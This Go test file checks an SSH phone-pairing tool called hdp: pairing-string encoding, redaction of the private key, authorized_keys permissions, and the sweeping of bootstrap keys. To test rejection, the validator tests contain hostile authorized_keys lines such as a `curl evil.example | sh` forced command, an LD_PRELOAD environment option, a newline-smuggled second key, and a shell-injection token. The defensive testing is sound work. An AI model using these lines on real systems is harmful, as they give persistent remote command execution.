package main

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// Tests for the two things in hdp that decide whether a user's machine is safe:
// the string that carries a private key, and the line that is written into
// authorized_keys.
//
// The pairing round trip gets the most attention because its failure modes are
// asymmetric: a payload that encodes fine and decodes wrong produces a phone
// that connects to the wrong port, or pins the wrong host key, with nothing on
// either screen to say so.

func samplePairing() Pairing {
	return Pairing{
		Version:     PairingVersion,
		Host:        "10.0.0.2",
		Port:        22,
		User:        "you",
		Key:         "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----\n",
		Fingerprint: "SHA256:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU",
		Name:        "Mac mini",
	}
}

func TestPairingRoundTrip(t *testing.T) {
	want := samplePairing()

	encoded, err := want.Encode()
	if err != nil {
		t.Fatalf("Encode: %v", err)
	}

	got, err := Decode(encoded)
	if err != nil {
		t.Fatalf("Decode: %v", err)
	}

	if got != want {
		t.Fatalf("round trip changed the payload:\n got %+v\nwant %+v", got, want)
	}
}

func TestPairingIsUrlSafe(t *testing.T) {
	// The string is meant to survive being pasted into a chat client, a URL
	// bar, a QR reader and a password manager. `+` and `/` are the two
	// characters that do not: one becomes a space in a form field, the other
	// ends a path.
	encoded, err := samplePairing().Encode()
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(encoded, "+/=") {
		t.Fatalf("encoded payload contains characters that do not survive a paste: %q", encoded)
	}
	for _, r := range encoded {
		ok := (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') ||
			(r >= '0' && r <= '9') || r == '-' || r == '_'
		if !ok {
			t.Fatalf("unexpected character %q in payload", r)
		}
	}
}

func TestDecodeToleratesTheWayPastesArrive(t *testing.T) {
	encoded, err := samplePairing().Encode()
	if err != nil {
		t.Fatal(err)
	}

	// Wrapped at 72 columns — which is exactly how `hdp pair` prints it, and
	// therefore the shape a user copying from a terminal actually gets.
	var wrapped strings.Builder
	for i, r := range encoded {
		if i > 0 && i%72 == 0 {
			wrapped.WriteString("\n")
		}
		wrapped.WriteRune(r)
	}

	// Computed rather than a literal "==": how much padding a base64url string
	// needs depends on its LENGTH, so a hard-coded pair only tests the padded
	// path when the fixture happens to need exactly two characters.
	padding := strings.Repeat("=", (4-len(encoded)%4)%4)

	cases := map[string]string{
		"as printed (wrapped)": wrapped.String(),
		"trailing newline":     encoded + "\n",
		"surrounded by spaces": "  " + encoded + "  ",
		"windows line endings": encoded[:40] + "\r\n" + encoded[40:],
		"padded base64":        encoded + padding,
	}
	for name, input := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Decode(input); err != nil {
				t.Fatalf("Decode(%s) failed: %v", name, err)
			}
		})
	}
}

func TestDecodeRejectsBadInput(t *testing.T) {
	cases := map[string]string{
		"empty":               "",
		"whitespace":          "   \n  ",
		"not base64":          "this is not a pairing string!",
		"valid b64, not json": base64.RawURLEncoding.EncodeToString([]byte("hello")),
	}
	for name, input := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Decode(input); err == nil {
				t.Fatalf("Decode(%s) should have failed", name)
			}
		})
	}
}

func TestDecodeRejectsAFutureVersion(t *testing.T) {
	// The reason `v` is the first field. A payload from a newer hdp must say so
	// in words, because the alternative is a user staring at "invalid string"
	// holding a perfectly valid string.
	future := samplePairing()
	future.Version = PairingVersion + 1
	raw, _ := json.Marshal(future)
	encoded := base64.RawURLEncoding.EncodeToString(raw)

	_, err := Decode(encoded)
	if err == nil {
		t.Fatal("a newer payload version must not be accepted")
	}
	if !strings.Contains(err.Error(), "version") {
		t.Fatalf("the error should name the version problem, got: %v", err)
	}
}

func TestDecodeRejectsUnknownFields(t *testing.T) {
	// A field this build does not understand means the payload carries
	// information we would silently drop — and pairing "successfully" with half
	// the settings is worse than refusing.
	raw := `{"v":1,"h":"h","p":22,"u":"u","k":"k","f":"SHA256:x","future":true}`
	encoded := base64.RawURLEncoding.EncodeToString([]byte(raw))

	if _, err := Decode(encoded); err == nil {
		t.Fatal("an unknown field must not be silently ignored")
	}
}

func TestValidateCatchesEachMissingField(t *testing.T) {
	cases := map[string]func(p *Pairing){
		"no host":        func(p *Pairing) { p.Host = "" },
		"no user":        func(p *Pairing) { p.User = "" },
		"no key":         func(p *Pairing) { p.Key = "" },
		"no fingerprint": func(p *Pairing) { p.Fingerprint = "" },
		"port zero":      func(p *Pairing) { p.Port = 0 },
		"port too big":   func(p *Pairing) { p.Port = 70000 },
	}
	for name, mangle := range cases {
		t.Run(name, func(t *testing.T) {
			p := samplePairing()
			mangle(&p)
			if err := p.Validate(); err == nil {
				t.Fatalf("%s should not validate", name)
			}
		})
	}
}

func TestStringRedactsTheKey(t *testing.T) {
	// A struct printed with %v in an error path puts a private key into a
	// terminal someone may be sharing. The key is short-lived and restricted,
	// and it is still a credential.
	got := samplePairing().String()
	if strings.Contains(got, "BEGIN OPENSSH PRIVATE KEY") {
		t.Fatalf("String() leaked the private key: %s", got)
	}
	if !strings.Contains(got, "you@10.0.0.2:22") {
		t.Fatalf("String() should still be useful, got: %s", got)
	}
}

// ---------------------------------------------------------- authorized_keys ---

func TestBootstrapLinePinsAllFourParts(t *testing.T) {
	line := BootstrapLine("ssh-ed25519 AAAA test", "/usr/local/bin/hdp",
		"/home/you/.ssh/authorized_keys", "1700000000000000000")

	// `restrict` is the difference between "a key that can install a key" and
	// "a login key in a QR code".
	if !strings.HasPrefix(line, "restrict,") {
		t.Fatalf("the line must start with restrict: %s", line)
	}
	// An ABSOLUTE path: a forced command is run by a non-interactive shell
	// whose PATH rarely contains wherever hdp was installed, and the failure is
	// a pairing that hangs rather than an error.
	if !strings.Contains(line, `command="/usr/local/bin/hdp __exchange '/home/you/.ssh/authorized_keys' 1700000000000000000"`) {
		t.Fatalf("the forced command must be an absolute path AND carry the "+
			"authorized_keys path, so the two halves of pairing cannot disagree "+
			"about which file to write — and the token, so the exchange can "+
			"delete the one line it was run by: %s", line)
	}
	// The handle the cleanup removes it by.
	if !strings.HasSuffix(line, bootstrapMarker+"1700000000000000000") {
		t.Fatalf("the line must end with its own token: %s", line)
	}
	if !strings.Contains(line, "ssh-ed25519 AAAA test") {
		t.Fatalf("the key itself is missing: %s", line)
	}
}

func TestValidatePublicKeyLineRejectsOptions(t *testing.T) {
	// THE ATTACK THIS EXISTS FOR. authorized_keys lines may carry options, and
	// sshd HONOURS them: a phone (or anything that reached the exchange
	// channel) could otherwise install a line that runs a command of its
	// choosing on every future login.
	bad := []string{
		`command="curl evil.example | sh" ssh-ed25519 AAAA`,
		`environment="LD_PRELOAD=/tmp/x.so" ssh-ed25519 AAAA`,
		`permitopen="any:any" ssh-ed25519 AAAA`,
		`from="192.168.1.1" ssh-ed25519 AAAA`,
	}
	for _, line := range bad {
		if err := validatePublicKeyLine(line); err == nil {
			t.Fatalf("an options-prefixed line must be refused: %s", line)
		}
	}
}

func TestValidatePublicKeyLineRejectsSmuggling(t *testing.T) {
	cases := map[string]string{
		"embedded newline": "ssh-ed25519 AAAA x\ncommand=\"evil\" ssh-ed25519 BBBB",
		"carriage return":  "ssh-ed25519 AAAA x\rss-ed25519 BBBB",
		"nul":              "ssh-ed25519 AAAA\x00",
		"empty":            "",
		"only a type":      "ssh-ed25519",
		"not a key at all": "hello world",
		"absurdly long":    "ssh-ed25519 " + strings.Repeat("A", 9000),
	}
	for name, line := range cases {
		t.Run(name, func(t *testing.T) {
			if err := validatePublicKeyLine(line); err == nil {
				t.Fatalf("%s must be refused", name)
			}
		})
	}
}

func TestValidatePublicKeyLineAcceptsRealKeys(t *testing.T) {
	_, pub, err := NewBootstrapKey()
	if err != nil {
		t.Fatal(err)
	}
	if err := validatePublicKeyLine(pub); err != nil {
		t.Fatalf("a key we generated ourselves was refused: %v", err)
	}
	// With the app's own marker, which is exactly what arrives over the wire.
	if err := validatePublicKeyLine(pub + " hdp-pocket"); err != nil {
		t.Fatalf("a marked key was refused: %v", err)
	}
}

func TestSameKeyMaterialIgnoresTheComment(t *testing.T) {
	// Pairing the same phone twice must not append a second copy: the user
	// would be left with two lines that `unpair` removes one at a time, which
	// reads as "unpair is broken".
	a := "ssh-ed25519 AAAAKEY first-pairing"
	b := "ssh-ed25519 AAAAKEY second-pairing"
	if !sameKeyMaterial(a, b) {
		t.Fatal("the same key blob with different comments is the same key")
	}
	if sameKeyMaterial(a, "ssh-ed25519 OTHERKEY first-pairing") {
		t.Fatal("different keys must not be treated as the same")
	}
}

func TestAuthorizedKeysAddAndRemoveRoundTrip(t *testing.T) {
	dir := t.TempDir()
	keys := &AuthorizedKeys{Path: filepath.Join(dir, ".ssh", "authorized_keys")}

	if err := keys.Add("ssh-ed25519 AAAA someone-elses-key"); err != nil {
		t.Fatal(err)
	}
	if err := keys.Add(BootstrapLine("ssh-ed25519 BBBB ours", "/bin/hdp", keys.Path, "7")); err != nil {
		t.Fatal(err)
	}

	lines, err := keys.Lines()
	if err != nil {
		t.Fatal(err)
	}
	if len(lines) != 2 {
		t.Fatalf("expected 2 lines, got %d: %v", len(lines), lines)
	}

	removed, err := keys.RemoveMatching(func(l string) bool {
		return strings.Contains(l, bootstrapMarker+"7")
	})
	if err != nil {
		t.Fatal(err)
	}
	if removed != 1 {
		t.Fatalf("expected to remove exactly 1 line, removed %d", removed)
	}

	// THE LINE THAT MATTERS: somebody else's key must survive untouched. The
	// rewrite is a read-modify-write of a file that decides who can log in, and
	// dropping an unrelated line would lock the user out of their own machine.
	lines, _ = keys.Lines()
	if len(lines) != 1 || lines[0] != "ssh-ed25519 AAAA someone-elses-key" {
		t.Fatalf("an unrelated key was damaged: %v", lines)
	}
}

func TestAuthorizedKeysRemovesNothingWhenNothingMatches(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	keys := &AuthorizedKeys{Path: path}

	if err := keys.Add("ssh-ed25519 AAAA keep-me"); err != nil {
		t.Fatal(err)
	}
	before, _ := os.ReadFile(path)

	removed, err := keys.RemoveMatching(func(string) bool { return false })
	if err != nil {
		t.Fatal(err)
	}
	if removed != 0 {
		t.Fatalf("removed %d lines for a predicate that matches nothing", removed)
	}

	after, _ := os.ReadFile(path)
	if string(before) != string(after) {
		t.Fatal("the file was rewritten even though nothing matched")
	}
}

func TestAuthorizedKeysWritingIsModeSafe(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".ssh", "authorized_keys")
	keys := &AuthorizedKeys{Path: path}

	if err := keys.Add("ssh-ed25519 AAAA x"); err != nil {
		t.Fatal(err)
	}

	// sshd's StrictModes REFUSES an authorized_keys that is group- or
	// world-writable, and refuses the whole file rather than the one line. What
	// the user sees is "pairing succeeded" and then an authentication failure
	// that points at the key rather than at the permissions.
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Fatalf("authorized_keys is %o, sshd needs 0600", perm)
	}

	dirInfo, err := os.Stat(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if perm := dirInfo.Mode().Perm(); perm != 0o700 {
		t.Fatalf(".ssh is %o, sshd needs 0700", perm)
	}
}

func TestAuthorizedKeysHandlesAMissingFile(t *testing.T) {
	dir := t.TempDir()
	keys := &AuthorizedKeys{Path: filepath.Join(dir, "nope", "authorized_keys")}

	lines, err := keys.Lines()
	if err != nil {
		t.Fatalf("a missing file is not an error, it is an empty file: %v", err)
	}
	if len(lines) != 0 {
		t.Fatalf("expected no lines, got %v", lines)
	}
}

func TestBootstrapLineRefusesAnUnquotablePath(t *testing.T) {
	// A path with a quote in it cannot be embedded in `command="..."` without a
	// second escaping rule, and no real authorized_keys path has one. Loud
	// refusal beats a half-quoted shell word.
	for _, bad := range []string{
		"/home/you/.ssh/authorized\"keys",
		"/home/it's/.ssh/authorized_keys",
		"relative/path",
		"",
	} {
		t.Run(bad, func(t *testing.T) {
			defer func() {
				if recover() == nil {
					t.Fatalf("BootstrapLine accepted the path %q", bad)
				}
			}()
			BootstrapLine("ssh-ed25519 AAAA x", "/bin/hdp", bad, "7")
		})
	}
}

func TestExchangeUsesThePathFromItsArgument(t *testing.T) {
	// THE REGRESSION THIS EXISTS FOR. The forced command runs inside sshd's
	// process, where HOME comes from the passwd entry — so a `hdp pair` that
	// resolved a different path would install the phone's key somewhere else
	// and still report success. Measured: it appended to the developer's real
	// ~/.ssh/authorized_keys while the pairing looked like it had worked.
	explicit := t.TempDir()
	decoy := t.TempDir()
	t.Setenv("HOME", decoy)

	_, pub, err := NewBootstrapKey()
	if err != nil {
		t.Fatal(err)
	}

	path := filepath.Join(explicit, "authorized_keys")
	var out, errOut strings.Builder
	if code := runExchange([]string{path}, strings.NewReader(pub+" hdp-pocket p\n"),
		&out, &errOut); code != 0 {
		t.Fatalf("exchange failed: %s", errOut.String())
	}

	if _, err := os.Stat(path); err != nil {
		t.Fatalf("the key did not land at the path it was given: %v", err)
	}
	// And nothing was written anywhere else.
	decoyPath := filepath.Join(decoy, ".ssh", "authorized_keys")
	if _, err := os.Stat(decoyPath); err == nil {
		t.Fatalf("the key also landed under HOME — the argument was ignored")
	}
}

func TestAuthorizedKeysFileFromParsesSshdOutput(t *testing.T) {
	dump := `port 22
listenaddress 0.0.0.0
authorizedkeysfile	.ssh/authorized_keys .ssh/authorized_keys2
passwordauthentication yes
`
	got := authorizedKeysFileFrom(dump)
	if got != ".ssh/authorized_keys" {
		t.Fatalf("got %q, want the FIRST path — that is the one sshd reads", got)
	}

	// The value is tab-separated in real output, which `strings.Fields` handles;
	// this checks that a different separator does not silently yield nothing.
	if authorizedKeysFileFrom("port 22\n") != "" {
		t.Fatal("a dump with no authorizedkeysfile must yield empty, not a guess")
	}
}

func TestFingerprintReadsBothKeyFileLayouts(t *testing.T) {
	// The two sources put the key in different columns, and a fixed index
	// silently reads the key TYPE for one of them — failing base64, so the
	// fallback becomes dead code that looks alive.
	const blob = "YWJj" // the three bytes "abc"
	const want = "SHA256:ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0"

	pubFile := "ssh-ed25519 " + blob + " some-comment\n"
	if got, err := fingerprintOfAuthorizedKey(pubFile); err != nil || got != want {
		t.Fatalf("/etc/ssh layout: got %q err %v", got, err)
	}

	keyscan := "127.0.0.1 ssh-ed25519 " + blob + "\n"
	if got, err := fingerprintOfAuthorizedKey(keyscan); err != nil || got != want {
		t.Fatalf("ssh-keyscan layout: got %q err %v", got, err)
	}

	// ssh-keyscan prefixes a comment line with `#`, which must be skipped.
	withBanner := "# 127.0.0.1:22 SSH-2.0-OpenSSH_10.2\n127.0.0.1 ssh-ed25519 " + blob + "\n"
	if got, err := fingerprintOfAuthorizedKey(withBanner); err != nil || got != want {
		t.Fatalf("ssh-keyscan with banner: got %q err %v", got, err)
	}
}

func TestFingerprintIsOverTheDecodedBlob(t *testing.T) {
	// The construction `ssh-keygen -lf` uses: sha256 over the DECODED blob,
	// standard base64 with the padding stripped. Worked example with a blob of
	// the three bytes "abc" so the expected value is checkable by hand.
	//
	// Hashing the TEXT of the key line instead produces a string of exactly the
	// right shape that matches nothing, and the failure it causes — "the host
	// key changed on a machine nobody touched" — sends the user looking at
	// their server instead of at this function.
	line := "ssh-ed25519 YWJj some-comment"
	got, err := fingerprintOfAuthorizedKey(line)
	if err != nil {
		t.Fatal(err)
	}
	const want = "SHA256:ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0"
	if got != want {
		t.Fatalf("got %s, want %s", got, want)
	}

	// The comment is not part of the key, so it must not change the answer —
	// the same property `sameKeyMaterial` relies on.
	other, err := fingerprintOfAuthorizedKey("ssh-ed25519 YWJj a-different-comment")
	if err != nil {
		t.Fatal(err)
	}
	if other != got {
		t.Fatalf("the comment changed the fingerprint: %s vs %s", other, got)
	}

	if _, err := fingerprintOfAuthorizedKey("ssh-ed25519 !!!not-base64!!!"); err == nil {
		t.Fatal("a line with no decodable blob must be an error, not a guess")
	}
}

func TestWrapBreaksTheStringIntoEqualPieces(t *testing.T) {
	long := strings.Repeat("abcdefghij", 20) // 200 chars
	lines := wrap(long, 72)

	if len(lines) != 3 {
		t.Fatalf("expected 3 lines, got %d", len(lines))
	}
	for i, line := range lines[:2] {
		if len(line) != 72 {
			t.Fatalf("line %d is %d chars, want 72", i, len(line))
		}
	}
	if strings.Join(lines, "") != long {
		t.Fatal("wrapping lost or reordered characters — that would corrupt a paste")
	}

	// Short input must not be padded or split.
	if got := wrap("short", 72); len(got) != 1 || got[0] != "short" {
		t.Fatalf("short input was mangled: %v", got)
	}
}

func TestExchangeInstallsTheKeyAndReportsIt(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)

	_, pub, err := NewBootstrapKey()
	if err != nil {
		t.Fatal(err)
	}

	var out, errOut strings.Builder
	code := runExchange(nil, strings.NewReader(pub+" hdp-pocket test-phone\n"), &out, &errOut)
	if code != 0 {
		t.Fatalf("exchange failed: %s", errOut.String())
	}
	if !strings.Contains(out.String(), exchangeOK) {
		t.Fatalf("the phone needs %q to know it worked, got: %q", exchangeOK, out.String())
	}

	keys := &AuthorizedKeys{Path: filepath.Join(dir, ".ssh", "authorized_keys")}
	lines, err := keys.Lines()
	if err != nil {
		t.Fatal(err)
	}
	if len(lines) != 1 || !strings.Contains(lines[0], "hdp-pocket") {
		t.Fatalf("the phone's key was not installed: %v", lines)
	}
}

func TestExchangeRefusesAnOptionsLine(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)

	var out, errOut strings.Builder
	code := runExchange(
		nil,
		strings.NewReader(`command="echo pwned" ssh-ed25519 AAAA evildoer`+"\n"),
		&out, &errOut,
	)
	if code == 0 {
		t.Fatal("exchange must refuse a line carrying sshd options")
	}
	if strings.Contains(out.String(), exchangeOK) {
		t.Fatal("a refused key must not be reported as installed")
	}

	keys := &AuthorizedKeys{Path: filepath.Join(dir, ".ssh", "authorized_keys")}
	if lines, _ := keys.Lines(); len(lines) != 0 {
		t.Fatalf("nothing should have been written: %v", lines)
	}
}

func TestExchangeIsIdempotent(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)

	_, pub, err := NewBootstrapKey()
	if err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 3; i++ {
		var out, errOut strings.Builder
		if code := runExchange(nil, strings.NewReader(pub+" hdp-pocket phone\n"), &out, &errOut); code != 0 {
			t.Fatalf("run %d failed: %s", i, errOut.String())
		}
	}

	keys := &AuthorizedKeys{Path: filepath.Join(dir, ".ssh", "authorized_keys")}
	lines, _ := keys.Lines()
	if len(lines) != 1 {
		t.Fatalf("pairing three times appended %d lines, want 1: %v", len(lines), lines)
	}
}

func TestExchangeRejectsAnEmptyStdin(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)

	var out, errOut strings.Builder
	if code := runExchange(nil, strings.NewReader(""), &out, &errOut); code == 0 {
		t.Fatal("an empty stdin must not be reported as success")
	}
}

func TestDecodeErrorMentionsWhatToDo(t *testing.T) {
	// The one error message a user is most likely to read. "Invalid input" and
	// nothing else is how someone concludes the feature is broken.
	_, err := Decode("definitely not a pairing string")
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "pairing string") {
		t.Fatalf("the message should name what was expected, got: %v", err)
	}
}

func TestPairingLeavesNoTemporaryKeyBehind(t *testing.T) {
	// The four ways out of `pair` are: the phone arrives, the window expires,
	// Ctrl-C, and a crash. The first two call the cleanup through a `defer`;
	// the third did not, and left a one-time credential in authorized_keys for
	// good — measured, by pressing Ctrl-C during a real pairing.
	//
	// What this test can check is the sweep that catches the survivors: any
	// `hdp-bootstrap-*` line already present is removed before a new one is
	// added, whatever left it there.
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	keys := &AuthorizedKeys{Path: path}

	// Two leftovers from runs that were killed, plus a real phone.
	for _, leftover := range []string{"111", "222"} {
		if err := keys.Add(BootstrapLine("ssh-ed25519 AAAA old", "/bin/hdp", path, leftover)); err != nil {
			t.Fatal(err)
		}
	}
	if err := keys.Add("ssh-ed25519 AAAA phone hdp-pocket-test"); err != nil {
		t.Fatal(err)
	}

	swept, err := keys.RemoveMatching(func(l string) bool {
		return strings.Contains(l, bootstrapMarker)
	})
	if err != nil {
		t.Fatal(err)
	}
	if swept != 2 {
		t.Fatalf("swept %d leftovers, want 2", swept)
	}

	lines, _ := keys.Lines()
	if len(lines) != 1 {
		t.Fatalf("expected only the phone to survive, got %v", lines)
	}
	if !strings.Contains(lines[0], clientMarker) {
		t.Fatalf("the sweep took a paired phone with it: %v", lines)
	}
}

func TestExistingPairedPhonesCountsOnlyPhones(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	keys := &AuthorizedKeys{Path: path}

	if existingPairedPhones(keys) != 0 {
		t.Fatal("an empty file has no paired phones")
	}
	if err := keys.Add("ssh-ed25519 AAAA someone hdp-bootstrap-1"); err != nil {
		t.Fatal(err)
	}
	if existingPairedPhones(keys) != 0 {
		t.Fatal("a bootstrap key is not a paired phone — counting it would make " +
			"the confirmation appear on every retry")
	}
	if err := keys.Add("ssh-ed25519 AAAA phone hdp-pocket-a"); err != nil {
		t.Fatal(err)
	}
	if err := keys.Add("ssh-ed25519 AAAA phone hdp-pocket-b"); err != nil {
		t.Fatal(err)
	}
	if got := existingPairedPhones(keys); got != 2 {
		t.Fatalf("counted %d, want 2", got)
	}
}

func TestSweepSparesACodeThatIsStillWaiting(t *testing.T) {
	// THE BUG THIS ENCODES, found by a user rather than by a test.
	//
	// The first sweep deleted every `hdp-bootstrap-*` line on the way in, on the
	// stated grounds that they were all inert. They are not: start `hdp pair` in
	// one terminal, start it again in another because the first looked stuck,
	// and the second run silently kills the first one's code. Scanning it then
	// fails authentication, and the app can only say "this pairing code has
	// expired" about a code that was valid a second earlier.
	now := time.Now()
	staleAfter := 15 * time.Minute

	live := BootstrapLine("ssh-ed25519 AAAA live", "/bin/hdp", "/k", "0"+strNanos(now))
	old := BootstrapLine("ssh-ed25519 AAAA old", "/bin/hdp", "/k", "0"+strNanos(now.Add(-time.Hour)))

	if isStaleBootstrap(live, now, staleAfter) {
		t.Fatal("a code issued just now was treated as a leftover — this is the " +
			"exact bug that made a valid pairing string report as expired")
	}
	if !isStaleBootstrap(old, now, staleAfter) {
		t.Fatal("an hour-old line must be swept, or they accumulate forever")
	}

	// And the sweep, run as `hdp pair` runs it, keeps the live one.
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	keys := &AuthorizedKeys{Path: path}
	if err := keys.Add(live, old); err != nil {
		t.Fatal(err)
	}
	swept, err := keys.RemoveMatching(func(l string) bool {
		return isStaleBootstrap(l, now, staleAfter)
	})
	if err != nil {
		t.Fatal(err)
	}
	if swept != 1 {
		t.Fatalf("swept %d, want exactly the stale one", swept)
	}
	lines, _ := keys.Lines()
	if len(lines) != 1 || !strings.Contains(lines[0], "live") {
		t.Fatalf("the live code did not survive: %v", lines)
	}
	if got := liveBootstrapCount(keys, now, staleAfter); got != 1 {
		t.Fatalf("liveBootstrapCount said %d, want 1 — this is what the warning "+
			"to the user is built from", got)
	}
}

func TestSweepTreatsAnUnparseableTokenAsStale(t *testing.T) {
	// A token in some other format came from a build that wrote a different
	// shape, so it cannot belong to a run that is waiting right now.
	now := time.Now()
	line := BootstrapLine("ssh-ed25519 AAAA x", "/bin/hdp", "/k", "1")
	if !isStaleBootstrap(line, now, time.Hour) {
		t.Fatal("an unparseable token must be swept rather than kept forever")
	}
}

func strNanos(t time.Time) string {
	return strconv.FormatInt(t.UnixNano(), 10)
}

// TestBootstrapLineRefusesANonDecimalToken keeps the token out of the shell.
//
// It travels inside `command="..."`, so a token with a space or a quote in it
// would add a shell word to a line sshd runs. The value is generated here and
// is a decimal clock reading; this is the guard that keeps it that way.
func TestBootstrapLineRefusesANonDecimalToken(t *testing.T) {
	for _, bad := range []string{"", "tok123", "12 34", `1"; id; "`} {
		t.Run(bad, func(t *testing.T) {
			defer func() {
				if recover() == nil {
					t.Fatalf("BootstrapLine accepted the token %q", bad)
				}
			}()
			BootstrapLine("ssh-ed25519 AAAA x", "/bin/hdp", "/k", bad)
		})
	}
}

// TestPairingWithAPhoneAlreadyPairedIsNotInstantSuccess is THE regression test
// for the bug the user hit.
//
// The first version of the wait looked only for the `hdp-pocket` comment, so on
// a machine that already had a phone paired it matched that phone's line on its
// first poll: `hdp pair` printed "Paired", removed its own bootstrap line, and
// the code still on screen was dead. The person scanning it got "this pairing
// code has expired" for a code that had never been usable — reported, verbatim,
// as "a machine's code can only be used once?"
func TestPairingWithAPhoneAlreadyPairedIsNotInstantSuccess(t *testing.T) {
	dir := t.TempDir()
	keys := &AuthorizedKeys{Path: filepath.Join(dir, "authorized_keys")}

	// One phone from an earlier month, and this run's own bootstrap line.
	if err := keys.Add("ssh-ed25519 AAAAOLD first-phone hdp-pocket"); err != nil {
		t.Fatal(err)
	}
	already := pairedPhoneBlobs(keys)
	if len(already) != 1 {
		t.Fatalf("the existing phone was not snapshotted: %v", already)
	}
	if err := keys.Add(BootstrapLine("ssh-ed25519 BBBBNEW one-time", "/bin/hdp", keys.Path, "42")); err != nil {
		t.Fatal(err)
	}

	// The state right after the QR is printed: nothing new has arrived, so the
	// wait must NOT be finished. A deadline in the past makes the point without
	// a two-second sleep.
	_, err := waitForClientKey(keys, time.Now().Add(-time.Second), already, "42")
	if err == nil {
		t.Fatal("the wait finished before the new phone arrived — this is the " +
			"bug that made a freshly printed pairing code report as expired")
	}

	// The new phone arrives.
	if err := keys.Add("ssh-ed25519 AAAANEW second-phone hdp-pocket"); err != nil {
		t.Fatal(err)
	}
	line, err := waitForClientKey(keys, time.Now().Add(time.Second), already, "42")
	if err != nil {
		t.Fatalf("the new phone's key was not seen: %v", err)
	}
	if !strings.Contains(line, "ed25519") {
		t.Fatalf("describeKey should name the key type, got %q", line)
	}

	// And the phone that was already paired is not mistaken for the new one.
	if _, ok := newPhoneLine([]string{"ssh-ed25519 AAAAOLD first-phone hdp-pocket"}, already); ok {
		t.Fatal("an already-paired phone's line was read as a new arrival")
	}
}

// TestExchangeRemovesTheLineItWasRunBy is the other half of the fix.
//
// Two reasons it matters. The credential dies at the instant it is used rather
// than when the parent process next looks at the file — the window a photograph
// of the screen would like to have. And when the SAME phone re-pairs, its key
// line is unchanged, so the disappearance of this line is the only evidence
// that anything happened at all.
func TestExchangeRemovesTheLineItWasRunBy(t *testing.T) {
	dir := t.TempDir()
	keys := &AuthorizedKeys{Path: filepath.Join(dir, "authorized_keys")}
	if err := keys.Add(
		"ssh-ed25519 AAAAOTHER someone-else",
		BootstrapLine("ssh-ed25519 BBBBONE-TIME", "/bin/hdp", keys.Path, "99"),
	); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr strings.Builder
	code := runExchange([]string{keys.Path, "99"},
		strings.NewReader("ssh-ed25519 AAAAPHONE mine hdp-pocket\n"), &stdout, &stderr)
	if code != 0 {
		t.Fatalf("exchange failed: %s", stderr.String())
	}
	if !strings.Contains(stdout.String(), exchangeOK) {
		t.Fatalf("the app's marker is missing: %q", stdout.String())
	}

	lines, _ := keys.Lines()
	for _, line := range lines {
		if strings.Contains(line, bootstrapMarker) {
			t.Fatalf("the one-time key outlived the exchange: %v", lines)
		}
	}
	if len(lines) != 2 {
		t.Fatalf("expected the other key plus the phone's, got %v", lines)
	}
	if _, ok := newestPhoneLine(lines); !ok {
		t.Fatalf("the phone's key is not in the file: %v", lines)
	}
}

// TestRepairingTheSamePhoneIsSeenByTheLineGoingAway covers rule 2 of the wait.
func TestRepairingTheSamePhoneIsSeenByTheLineGoingAway(t *testing.T) {
	dir := t.TempDir()
	keys := &AuthorizedKeys{Path: filepath.Join(dir, "authorized_keys")}
	phone := "ssh-ed25519 AAAAPHONE mine hdp-pocket"
	if err := keys.Add(phone); err != nil {
		t.Fatal(err)
	}
	already := pairedPhoneBlobs(keys)

	// Same phone, so nothing new appears — but the bootstrap line is gone,
	// because the exchange removed it on its way through.
	line, err := waitForClientKey(keys, time.Now().Add(time.Second), already, "7")
	if err != nil {
		t.Fatalf("a re-pairing that consumed the code was reported as a timeout: %v", err)
	}
	if !strings.Contains(line, "ed25519") {
		t.Fatalf("the phone's own key should be named, got %q", line)
	}

	// A line that vanishes while our own is still there means nothing.
	if err := keys.Add(BootstrapLine("ssh-ed25519 BBBBX", "/bin/hdp", keys.Path, "7")); err != nil {
		t.Fatal(err)
	}
	if _, err := waitForClientKey(keys, time.Now().Add(-time.Second), already, "7"); err == nil {
		t.Fatal("a wait with its own code still in the file must not finish")
	}
}
